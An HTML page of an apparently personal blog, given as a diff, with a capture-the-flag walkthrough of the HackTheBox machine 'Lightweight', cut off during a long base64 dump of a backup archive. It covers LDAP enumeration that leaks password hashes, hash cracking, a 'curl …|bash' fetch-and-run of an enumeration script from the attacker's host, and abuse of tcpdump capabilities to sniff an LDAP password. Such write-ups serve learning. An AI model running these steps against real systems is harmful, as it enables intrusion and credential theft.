@@ -1,0 +1,665 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Lightweight | Recon m4rc0ff@SittingDucks:~$ nmap -sC -sV 10.10.10.119 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 12:08 BST Nmap scan report...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">
+
+  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
+  <script src="/tipuesearch_content.js"></script>
+  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
+  <script src="/theme/tipuesearch/tipuesearch.js"></script>
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Lightweight</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation"> 
+	  
+		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
+		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
+		</form>
+		
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="htts://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
+<i class="fa fa-twitter fa-lg"></i></a>
+                <a href="https://github.com/M4rc0ff" title="github" >
+<i class="fa fa-github fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-06-19 22:06:00+01:00">Fri 19 June 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Lightweight.html">Lightweight</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Lightweight.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <h1 id="recon">Recon</h1>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> nmap -sC -sV <span class="m">10</span>.10.10.119
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 12:08 BST</span>
+<span class="go">Nmap scan report for lightweight.htb (10.10.10.119)</span>
+<span class="go">Host is up (0.66s latency).</span>
+<span class="go">Not shown: 997 filtered ports</span>
+<span class="go">PORT    STATE  SERVICE VERSION</span>
+<span class="go">22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)</span>
+<span class="go">| ssh-hostkey: </span>
+<span class="go">|   2048 19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73 (RSA)</span>
+<span class="go">|   256 88:58:a1:cf:38:cd:2e:15:1d:2c:7f:72:06:a3:57:67 (ECDSA)</span>
+<span class="go">|_  256 31:6c:c1:eb:3b:28:0f:ad:d5:79:72:8f:f5:b5:49:db (ED25519)</span>
+<span class="go">80/tcp  closed http</span>
+<span class="go">389/tcp open   ldap    OpenLDAP 2.2.X - 2.3.X</span>
+<span class="go">| ssl-cert: Subject: commonName=lightweight.htb</span>
+<span class="go">| Subject Alternative Name: DNS:lightweight.htb, DNS:localhost, DNS:localhost.localdomain</span>
+<span class="go">| Not valid before: 2018-06-09T13:32:51</span>
+<span class="go">|_Not valid after:  2019-06-09T13:32:51</span>
+<span class="go">|_ssl-date: TLS randomness does not represent time</span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 99.93 seconds</span>
+</pre></div>
+
+
+<p>We web page on port 80 shows this:</p>
+<p><img alt="" src="../images/lightweight-home.png"></p>
+<p>When trying to search for directories with <code>gobuster</code> I started seeing this:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> gobuster dir -u http://10.10.10.119 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html
+<span class="go">===============================================================</span>
+<span class="go">Gobuster v3.0.1</span>
+<span class="go">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span>
+<span class="go">===============================================================</span>
+<span class="go">[+] Url:            http://10.10.10.119</span>
+<span class="go">[+] Threads:        10</span>
+<span class="go">[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span>
+<span class="go">[+] Status codes:   200,204,301,302,307,401,403</span>
+<span class="go">[+] User Agent:     gobuster/3.0.1</span>
+<span class="go">[+] Extensions:     php,txt,html</span>
+<span class="go">[+] Timeout:        10s</span>
+<span class="go">===============================================================</span>
+<span class="go">2020/06/22 12:19:13 Starting gobuster</span>
+<span class="go">===============================================================</span>
+<span class="go">/index.php (Status: 200)</span>
+<span class="go">/info.php (Status: 200)</span>
+<span class="go">/user.php (Status: 200)</span>
+<span class="go">[ERROR] 2020/06/22 12:19:23 [!] Get http://10.10.10.119/static.txt: dial tcp 10.10.10.119:80: connect: connection refused</span>
+<span class="go">[ERROR] 2020/06/22 12:19:24 [!] Get http://10.10.10.119/programs.php: dial tcp 10.10.10.119:80: connect: connection refused</span>
+<span class="go">[ERROR] 2020/06/22 12:19:28 [!] Get http://10.10.10.119/Home.txt: dial tcp 10.10.10.119:80: connect: connection refused</span>
+<span class="go">[ERROR] 2020/06/22 12:19:29 [!] Get http://10.10.10.119/strona_14: dial tcp 10.10.10.119:80: connect: connection refused</span>
+<span class="go">[ERROR] 2020/06/22 12:19:32 [!] Get http://10.10.10.119/strona_8.php: dial tcp 10.10.10.119:80: connect: connection refused</span>
+<span class="go">[ERROR] 2020/06/22 12:19:34 [!] Get http://10.10.10.119/strona_2.txt: dial tcp 10.10.10.119:80: connect: connection refused</span>
+<span class="go">[ERROR] 2020/06/22 12:19:35 [!] Get http://10.10.10.119/strona_3: dial tcp 10.10.10.119:80: connect: connection refused</span>
+</pre></div>
+
+
+<p>I think the website went into protection mode and shut itself down for few minutes as It came back a bit later. I left scanning directories for a moment. </p>
+<p>The <code>nmap</code> output shows there is an SSL certificate with common name <code>lightweight.htb</code> so I add this to my <code>/etc/hosts</code> file.</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> nmap -p389 --script ldap-search <span class="m">10</span>.10.10.119
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 14:41 BST</span>
+<span class="go">Nmap scan report for lightweight.htb (10.10.10.119)</span>
+<span class="go">Host is up (0.080s latency).</span>
+
+<span class="go">PORT    STATE SERVICE</span>
+<span class="go">389/tcp open  ldap</span>
+<span class="go">| ldap-search:</span>
+<span class="go">|   Context: dc=lightweight,dc=htb</span>
+<span class="go">|     dn: dc=lightweight,dc=htb</span>
+<span class="go">|         objectClass: top</span>
+<span class="go">|         objectClass: dcObject</span>
+<span class="go">|         objectClass: organization</span>
+<span class="go">|         o: lightweight htb</span>
+<span class="go">|         dc: lightweight</span>
+<span class="go">|     dn: cn=Manager,dc=lightweight,dc=htb</span>
+<span class="go">|         objectClass: organizationalRole</span>
+<span class="go">|         cn: Manager</span>
+<span class="go">|         description: Directory Manager</span>
+<span class="go">|     dn: ou=People,dc=lightweight,dc=htb</span>
+<span class="go">|         objectClass: organizationalUnit</span>
+<span class="go">|         ou: People</span>
+<span class="go">|     dn: ou=Group,dc=lightweight,dc=htb</span>
+<span class="go">|         objectClass: organizationalUnit</span>
+<span class="go">|         ou: Group</span>
+<span class="go">|     dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb</span>
+<span class="go">|         uid: ldapuser1</span>
+<span class="go">|         cn: ldapuser1</span>
+<span class="go">|         sn: ldapuser1</span>
+<span class="go">|         mail: ldapuser1@lightweight.htb</span>
+<span class="go">|         objectClass: person</span>
+<span class="go">|         objectClass: organizationalPerson</span>
+<span class="go">|         objectClass: inetOrgPerson</span>
+<span class="go">|         objectClass: posixAccount</span>
+<span class="go">|         objectClass: top</span>
+<span class="go">|         objectClass: shadowAccount</span>
+<span class="go">|         userPassword: {crypt}$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/</span>
+<span class="go">|         shadowLastChange: 17691</span>
+<span class="go">|         shadowMin: 0</span>
+<span class="go">|         shadowMax: 99999</span>
+<span class="go">|         shadowWarning: 7</span>
+<span class="go">|         loginShell: /bin/bash</span>
+<span class="go">|         uidNumber: 1000</span>
+<span class="go">|         gidNumber: 1000</span>
+<span class="go">|         homeDirectory: /home/ldapuser1</span>
+<span class="go">|     dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb</span>
+<span class="go">|         uid: ldapuser2</span>
+<span class="go">|         cn: ldapuser2</span>
+<span class="go">|         sn: ldapuser2</span>
+<span class="go">|         mail: ldapuser2@lightweight.htb</span>
+<span class="go">|         objectClass: person</span>
+<span class="go">|         objectClass: organizationalPerson</span>
+<span class="go">|         objectClass: inetOrgPerson</span>
+<span class="go">|         objectClass: posixAccount</span>
+<span class="go">|         objectClass: top</span>
+<span class="go">|         objectClass: shadowAccount</span>
+<span class="go">|         userPassword: {crypt}$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1</span>
+<span class="go">|         shadowLastChange: 17691</span>
+<span class="go">|         shadowMin: 0</span>
+<span class="go">|         shadowMax: 99999</span>
+<span class="go">|         shadowWarning: 7</span>
+<span class="go">|         loginShell: /bin/bash</span>
+<span class="go">|         uidNumber: 1001</span>
+<span class="go">|         gidNumber: 1001</span>
+<span class="go">|         homeDirectory: /home/ldapuser2</span>
+<span class="go">|     dn: cn=ldapuser1,ou=Group,dc=lightweight,dc=htb</span>
+<span class="go">|         objectClass: posixGroup</span>
+<span class="go">|         objectClass: top</span>
+<span class="go">|         cn: ldapuser1</span>
+<span class="go">|         userPassword: {crypt}x</span>
+<span class="go">|         gidNumber: 1000</span>
+<span class="go">|     dn: cn=ldapuser2,ou=Group,dc=lightweight,dc=htb</span>
+<span class="go">|         objectClass: posixGroup</span>
+<span class="go">|         objectClass: top</span>
+<span class="go">|         cn: ldapuser2</span>
+<span class="go">|         userPassword: {crypt}x</span>
+<span class="go">|_        gidNumber: 1001</span>
+
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 0.76 seconds</span>
+</pre></div>
+
+
+<p>From the above output we found two password hashes for 2 users:</p>
+<ol>
+<li>
+<p><code>ldapuser1</code> </p>
+<p><code>$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/</code></p>
+</li>
+<li>
+<p><code>ldapuser2</code></p>
+<p><code>$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1</code></p>
+</li>
+</ol>
+<p>From the <code>hashcat</code> <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">Example hashes</a> page I can see these hashes match the types "sha512crypt $6$, SHA512 (Unix) 2", that is hash-mode 1800. Armed with this info I try to crack these.</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/lightweight$</span> hashcat -a <span class="m">0</span> -m <span class="m">1800</span> hash1.txt /usr/share/wordlists/rockyou.txt --force
+<span class="go">hashcat (v5.1.0) starting...      </span>
+
+<span class="go">OpenCL Platform #1: The pocl project                                       </span>
+<span class="go">====================================</span>
+<span class="go">* Device #1: pthread-Intel(R) Xeon(R) E-2186M  CPU @ 2.90GHz, 2048/5890 MB allocatable, 2MCU</span>
+
+<span class="go">Hashes: 1 digests; 1 unique digests, 1 unique salts</span>
+<span class="go">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span>
+<span class="go">Rules: 1</span>
+</pre></div>
+
+
+<p>It was taking a while so I left this running and went ahead with enumeration. The Home page showed three links. If I visit <code>info</code> I land to this page:</p>
+<p><img alt="" src="../images/lightweight-info.png"></p>
+<p>This is another confirmation of what I noticed before when I launched <code>gobuster</code>. There is also a suggestion to visit the <code>user</code> page if you like to get in the box! So let's see:</p>
+<p><img alt="" src="../images/lightweight-user.png"></p>
+<p>According to this page once there is an <code>http</code> request to the web page, a user will be created with the user name and password of the IP address of my box and we should be allowed SSH access. </p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> ssh <span class="m">10</span>.10.14.13@lightweight.htb
+<span class="go">The authenticity of host &#39;lightweight.htb (10.10.10.119)&#39; can&#39;t be established.</span>
+<span class="go">ECDSA key fingerprint is SHA256:FWyyew+o9WoPYkfIKGEbTMsexks1z8ZkSUs9O+2AMSU.</span>
+<span class="go">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
+<span class="go">Warning: Permanently added &#39;lightweight.htb&#39; (ECDSA) to the list of known hosts.</span>
+<span class="go">10.10.14.13@lightweight.htb&#39;s password: </span>
+<span class="go">Last failed login: Mon Jun 22 15:15:08 BST 2020 from 10.10.14.13 on ssh:notty</span>
+<span class="go">There were 2 failed login attempts since the last successful login.</span>
+<span class="gp">[10.10.14.13@lightweight ~]$</span> whoami
+<span class="go">10.10.14.13</span>
+<span class="gp">[10.10.14.13@lightweight ~]$</span> ll
+<span class="go">total 0</span>
+</pre></div>
+
+
+<p>The is nothing in <code>10.10.14.13</code> home directory and if I move to the <code>/home</code> directory I can see this:</p>
+<div class="highlight"><pre><span></span><span class="gp">[10.10.14.13@lightweight ~]$</span> <span class="nb">cd</span> /home/
+<span class="gp">[10.10.14.13@lightweight home]$</span> ll
+<span class="go">total 0</span>
+<span class="go">drwx------. 4 10.10.14.13 10.10.14.13  91 Jun 22 15:16 10.10.14.13</span>
+<span class="go">drwx------. 4 10.10.14.2  10.10.14.2   91 Nov 16  2018 10.10.14.2</span>
+<span class="go">drwx------. 2 127.0.0.1   127.0.0.1    62 Jun 22 12:07 127.0.0.1</span>
+<span class="go">drwx------. 4 ldapuser1   ldapuser1   181 Jun 15  2018 ldapuser1</span>
+<span class="go">drwx------. 4 ldapuser2   ldapuser2   197 Jun 21  2018 ldapuser2</span>
+</pre></div>
+
+
+<p>As expected there are the two ldap users directories as well as two more other directories. However, because of permissions we can't access any of them. </p>
+<p>After wandering around a bit and getting nowhere I ran <a href="https://github.com/rebootuser/LinEnum">LinEnum</a> from my box. To do that, I set up a python SimpleHTTPServer in the directory where I have <code>LinEnum</code> and then I ran this command on the victim box:</p>
+<div class="highlight"><pre><span></span><span class="gp">[10.10.14.13@lightweight home]$</span> curl http://10.10.14.13/LinEnum.sh<span class="p">|</span>bash
+
+<span class="go">&lt;SNIP&gt;</span>
+<span class="go">[+] Files with POSIX capabilities set:                                     </span>
+<span class="go">/usr/bin/ping = cap_net_admin,cap_net_raw+p                      </span>
+<span class="go">/usr/sbin/mtr = cap_net_raw+ep                                                                                                                         </span>
+<span class="go">/usr/sbin/suexec = cap_setgid,cap_setuid+ep                                                                                                            </span>
+<span class="go">/usr/sbin/arping = cap_net_raw+p                                                                                                                       </span>
+<span class="go">/usr/sbin/clockdiff = cap_net_raw+p                                                                                                                    </span>
+<span class="go">/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep</span>
+<span class="go">/home/ldapuser1/tcpdump = cap_net_admin,cap_net_raw+ep</span>
+<span class="go">/home/ldapuser1/openssl =ep</span>
+<span class="go">&lt;SNIP&gt;</span>
+</pre></div>
+
+
+<p>The output is quite long so above I only reported the bit that stood out to me. Particularly, this line <code>/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep</code> means that a normal user would be able to run <code>tcpdump</code> as <code>root</code>. More on Linux capabilities can be read <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">here</a>. Interesting! This was something I hadn't thought but now that I know it's available I started to think that could be useful to sniff useful information. Because we know that there is some kind of script that creates the user with our IP, that is called when there is an <code>http</code> request , maybe we can sniff some useful info.</p>
+<p>So I ran <code>tcpdump</code> instructing to save the pcap on a file called SittingDucks.pcap:</p>
+<div class="highlight"><pre><span></span><span class="gp">[10.10.14.13@lightweight ~]$</span> tcpdump -i any -w SittingDucks.pcap
+<span class="go">tcpdump: listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes</span>
+</pre></div>
+
+
+<p>Then I opened all the links available on the webpage, that is <code>info.php</code>, <code>status.php</code>, <code>user.php</code>.</p>
+<p>Then again I stop the <code>tcpdump</code> and I donwload the pcap to my box using <code>scp</code>:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/lightweight$</span> scp <span class="m">10</span>.10.14.13@10.10.10.119:~/SittingDucks.pcap .
+<span class="go">10.10.14.13@10.10.10.119&#39;s password: </span>
+<span class="go">SittingDucks.pcap</span>
+</pre></div>
+
+
+<p>Once in Wireshark I noticed an few entries related to the LDAP protocal and after inspecting these I noticed an authentication session for the user <code>ldapuser2</code>:</p>
+<p><img alt="" src="../images/lightweight-ldapuser2.png"></p>
+<p>The yellow highlighed vlue (<code>8bc8251332abe1d7f105d3e53ad39ac2</code>) is the password used for the "simple" authentication. Next, I try to switch user with <code>su</code> using the password just found and I am successful:</p>
+<div class="highlight"><pre><span></span><span class="gp">[10.10.14.13@lightweight ~]$</span> su ldapuser2
+<span class="go">Password: </span>
+<span class="gp">[ldapuser2@lightweight 10.10.14.13]$</span>
+</pre></div>
+
+
+<p>Easy enough now to grab the user flag:</p>
+<div class="highlight"><pre><span></span><span class="gp">[ldapuser2@lightweight 10.10.14.13]$</span> <span class="nb">cd</span> /home/ldapuser2
+<span class="gp">[ldapuser2@lightweight ~]$</span> ll
+<span class="go">total 1868</span>
+<span class="go">-rw-r--r--. 1 root      root         3411 Jun 14  2018 backup.7z</span>
+<span class="go">-rw-rw-r--. 1 ldapuser2 ldapuser2 1520530 Jun 13  2018 OpenLDAP-Admin-Guide.pdf</span>
+<span class="go">-rw-rw-r--. 1 ldapuser2 ldapuser2  379983 Jun 13  2018 OpenLdap.pdf</span>
+<span class="go">-rw-r--r--. 1 root      root           33 Jun 15  2018 user.txt</span>
+<span class="gp">[ldapuser2@lightweight ~]$</span> cat user.txt 
+<span class="go">8a****************************26</span>
+</pre></div>
+
+
+<p>backup files are always interesting so I copy the base64 string of <code>backup.7z</code>:</p>
+<div class="highlight"><pre><span></span><span class="gp">[ldapuser2@lightweight ~]$</span> base64 -w0 backup.7z <span class="o">&amp;&amp;</span> <span class="nb">echo</span>
+<span class="go">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